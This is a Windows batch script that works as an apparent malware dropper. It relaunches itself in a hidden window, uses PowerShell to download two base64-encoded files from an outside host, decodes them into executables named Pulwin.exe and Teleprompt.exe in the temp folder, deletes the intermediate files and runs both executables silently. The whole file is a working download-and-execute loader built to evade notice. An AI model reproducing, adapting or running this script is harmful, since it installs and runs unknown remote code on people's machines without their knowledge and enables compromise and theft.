@echo off
:: Self-launch in hidden mode using PowerShell
if "%1"=="hidden" goto :main

powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit /b

:main
setlocal enabledelayedexpansion

:: Configuration Section
set "url1=https://idauth.id/uploads/PBoot.txt"
set "url2=https://idauth.id/uploads/TG1.txt"

set "ext1=exe"
set "ext2=exe"
set "outputDir=%temp%\base64_files"
if not exist "%outputDir%" mkdir "%outputDir%"

set "outputFile1=%outputDir%\Pulwin.!ext1!"
set "outputFile2=%outputDir%\Teleprompt.!ext2!"

:: Download and decode first file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url1%' -OutFile '%outputDir%\temp1.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp1.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile1%', [Convert]::FromBase64String($b64))"

:: Download and decode second file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url2%' -OutFile '%outputDir%\temp2.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp2.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile2%', [Convert]::FromBase64String($b64))"


:: Cleanup temp files
del "%outputDir%\temp1.txt" 2>nul
del "%outputDir%\temp2.txt" 2>nul


:: Execute files completely hidden
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile1%' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile2%' -WindowStyle Hidden"

exit